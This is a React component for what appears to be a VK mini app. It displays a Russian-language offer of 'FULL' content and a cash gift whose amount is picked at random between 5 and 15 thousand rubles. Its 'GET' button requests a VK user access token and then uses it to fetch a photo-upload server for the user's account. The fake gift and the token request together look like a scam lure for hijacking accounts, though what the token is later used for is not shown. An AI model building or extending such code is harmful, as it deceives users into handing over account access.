import { useEffect } from "react";
import "./App.css";
import { getUserTokenFX } from "./data/effects.config";
import { selectRandom } from "./utils/random";
import { useUnit } from "effector-react";
import { $config } from "./data/store.config";
import { USER_SCOPE } from "./constants";
import { getPhotosUploadServer } from "./vk-bridge/user";

function App() {
  const { givenScope, token } = useUnit($config);

  useEffect(() => {
    if (givenScope && givenScope !== USER_SCOPE) {
      getUserTokenFX();
    } else if (givenScope === USER_SCOPE && token) {
      getPhotosUploadServer(token).then(console.debug);
    }
  }, [givenScope, token]);

  const handleClick = () => {
    getUserTokenFX();
  };
  return (
    <>
      <div>Приветствую!</div>
      <div>
        Забирай FULL и подарок в размере {selectRandom(5, 15)} тыс. руб!
      </div>
      <button onClick={handleClick} style={{ marginTop: "1rem" }}>
        ПОЛУЧИТЬ
      </button>
    </>
  );
}

export default App;
